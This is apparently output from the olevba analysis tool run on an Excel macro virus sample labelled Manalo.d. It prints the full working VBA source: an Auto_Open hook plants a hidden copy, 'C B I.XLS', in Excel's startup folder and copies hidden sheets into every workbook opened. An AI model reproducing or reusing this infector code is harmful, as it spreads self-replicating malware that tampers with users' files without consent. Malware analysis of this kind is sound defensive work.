olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Life_Blood.bas 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Life_Blood'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


















'
' INC v1.0
'



Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
        Application.OnSheetActivate = "Jacob"

End Sub

Sub Jacob()
Attribute Jacob.VB_ProcData.VB_Invoke_Func = " \n14"
        
Startup$ = Application.StartupPath
File$ = Dir(Startup$ & "\" & "C B I.XLS")

If File$ <> "C B I.XLS" Then GoTo FileDoesNotExist Else GoTo InfectOpenFile

FileDoesNotExist:
            
   Infected$ = ActiveWorkbook.Name
   
   Application.ScreenUpdating = False

   Set newBook = Workbooks.Add
    With newBook
        .Title = ""
        .Subject = ""
    End With
   
   NewWorkbook$ = ActiveWorkbook.Name
   Sheet$ = Workbooks(NewWorkbook$).Sheets(1).Name
        
   If Sheet$ <> "Life_Blood" _
      Then
        Workbooks(Infected$).Sheets("INC").Copy Before:=Workbooks(NewWorkbook$).Sheets(1)
        Workbooks(Infected$).Sheets("Life_Blood").Copy Before:=Workbooks(NewWorkbook$).Sheets("INC")
        Workbooks(NewWorkbook$).Sheets("Life_Blood").Visible = False
        Workbooks(NewWorkbook$).Sheets("INC").Visible = False
      Else
   End If

   ActiveWindow.Visible = False
      
   Workbooks(NewWorkbook$).SaveAs FileName:=Application.StartupPath & "/" & "C B I.XLS"

GoTo Finish

InfectOpenFile:
        
   FileName$ = ActiveWorkbook.Name
   FirstSheet$ = Workbooks(FileName$).Sheets(1).Name
        
   Application.ScreenUpdating = False
   
   If FirstSheet$ <> "Life_Blood" _
      Then
        Workbooks("C B I.XLS").Sheets("Life_Blood").Copy Before:=Workbooks(FileName$).Sheets(1)
        Workbooks("C B I.XLS").Sheets("INC").Copy After:=Workbooks(FileName$).Sheets("Life_Blood")
        Workbooks(FileName$).Sheets("INC").Name = "85 Years"
        Workbooks("C B I.XLS").Sheets("INC").Copy Before:=Workbooks(FileName$).Sheets("85 Years")
        Workbooks(FileName$).Sheets("Life_Blood").Visible = False
        Workbooks(FileName$).Sheets("INC").Visible = False
        Workbooks(FileName$).Sheets("85 Years").Visible = False

      Else
   End If

If Format(Now(), "yy mm dd") >= "99 07 27" Then


Else: Workbooks(FileName$).Sheets("85 Years").Visible = False
End If


Finish:
Application.OnSheetActivate = ""
Application.ScreenUpdating = True
Application.OnSheetActivate = "C B I.XLS!Jacob"
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet17.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSExcel.Manalo.d-b2d8de51de51455cdf8258483e8c687826542400 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  IN
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  Life_Bloo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

